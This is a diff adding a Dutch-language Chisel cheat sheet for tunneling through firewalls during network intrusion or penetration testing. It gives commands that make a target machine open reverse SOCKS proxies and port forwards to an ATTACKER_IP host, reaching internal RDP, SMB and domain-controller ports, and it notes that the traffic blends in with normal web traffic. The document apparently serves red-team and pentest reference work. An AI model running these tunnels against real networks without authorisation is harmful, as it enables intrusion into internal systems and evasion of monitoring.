@@ -1,0 +1,60 @@
+# Chisel — TCP tunneling over HTTP/WebSocket
+# Tunnelt TCP verkeer over HTTP(S) — werkt door firewalls en proxies heen
+#
+# === Syntax ===
+# chisel server -p PORT [opties]               (attacker)
+# chisel client SERVER:PORT TUNNEL [opties]     (doelwit)
+#
+# === Tunnel formaten ===
+# R:SOCKS                          Reverse SOCKS proxy
+# R:LOCAL_PORT:REMOTE_HOST:PORT    Reverse port forward
+# LOCAL_PORT:REMOTE_HOST:PORT      Local port forward
+#
+# === Server opties ===
+# -p PORT        Luister poort
+# --reverse      Sta reverse tunnels toe (vereist voor R: prefixes)
+# --auth USER:PASS   Authenticatie
+# --host HEADER  Host header voor routing
+# --tls-key      TLS private key
+# --tls-cert     TLS certificaat
+#
+# === Client opties ===
+# --auth USER:PASS       Authenticatie
+# --fingerprint HASH     Server fingerprint verificatie
+# --keepalive SECONDS    Keepalive interval
+# --tls-skip-verify      Skip TLS certificaat verificatie
+#
+# === Voorbeelden ===
+
+# === Reverse SOCKS proxy (meest gebruikt) ===
+# Attacker — start server
+chisel server -p 8080 --reverse
+
+# Doelwit — verbind en maak SOCKS proxy
+chisel client ATTACKER_IP:8080 R:socks
+# Gebruik: proxychains nmap TARGET of socks5 127.0.0.1 1080
+
+# === Reverse port forward ===
+# Attacker
+chisel server -p 8080 --reverse
+
+# Doelwit — forward remote RDP naar attacker
+chisel client ATTACKER_IP:8080 R:3389:INTERNAL_HOST:3389
+# Verbind: mstsc /v:127.0.0.1:3389
+
+# === Local port forward ===
+chisel client ATTACKER_IP:8080 8080:INTERNAL_HOST:80
+
+# === Meerdere tunnels tegelijk ===
+chisel client ATTACKER_IP:8080 R:socks R:3389:DC:3389 R:445:FILESERVER:445
+
+# === Met authenticatie en TLS ===
+chisel server -p 443 --reverse --auth admin:Geheim123
+chisel client --auth admin:Geheim123 ATTACKER_IP:443 R:socks
+
+# === Windows ===
+chisel.exe client ATTACKER_IP:8080 R:socks
+
+# Noot: SOCKS proxy draait default op 127.0.0.1:1080
+# Noot: Chisel is een enkel binary — makkelijk te deployen
+# Noot: HTTP traffic blends in met normaal webverkeer
